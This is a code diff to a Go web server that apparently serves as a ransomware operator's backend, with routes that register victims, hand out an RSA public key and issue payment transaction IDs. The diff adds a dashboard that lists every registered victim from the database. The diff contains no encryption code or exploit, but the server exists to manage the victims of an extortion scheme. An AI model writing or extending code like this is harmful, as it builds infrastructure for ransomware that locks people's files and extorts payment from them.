@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"html/template"
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -17,6 +18,29 @@ var db *gorm.DB
 
 func GiveTransactionID(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("your transaction id"))
+}
+
+type victimHtmlDisplay struct {
+	Count   int
+	Victims []Victim
+}
+
+func ServeVictimsDisplay(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "text/html")
+
+	var victims []Victim
+	db.Find(&victims)
+
+	htmlDisplay := &victimHtmlDisplay{
+		Count:   len(victims),
+		Victims: victims,
+	}
+
+	tmpl := template.Must(template.ParseFiles("./templates/victims.html"))
+	if err := tmpl.Execute(w, htmlDisplay); err != nil {
+		http.Error(w, fmt.Sprintf("could not execute html template: %s", err), http.StatusInternalServerError)
+		return
+	}
 }
 
 func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
@@ -104,6 +128,7 @@ func main() {
 	http.HandleFunc("/get_transaction", GiveTransactionID)
 	http.HandleFunc("/pubkey", GetRSAPubKey)
 	http.HandleFunc("/register", RegisterNewVictim)
+	http.HandleFunc("/dashboard", ServeVictimsDisplay)
 
 	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
 		log.Fatalf("error while running listenandserver: %s", err.Error())
